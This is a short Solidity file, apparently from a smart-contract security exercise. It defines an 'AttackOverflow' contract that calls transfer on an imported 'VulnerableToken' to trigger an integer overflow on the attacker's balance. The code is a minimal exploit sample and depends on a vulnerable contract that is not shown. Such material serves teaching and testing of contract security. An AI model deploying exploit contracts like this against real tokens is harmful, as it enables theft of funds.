// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./VulnerableToken.sol";

contract AttackOverflow {
    VulnerableToken public vulnerableToken;

    constructor(address _vulnerableTokenAddress) {
        vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
    }

    // Trigger an overflow on attacker's balance
    function exploitOverflow() public {
        vulnerableToken.transfer(msg.sender, 10); // Transfer tokens
    }
}
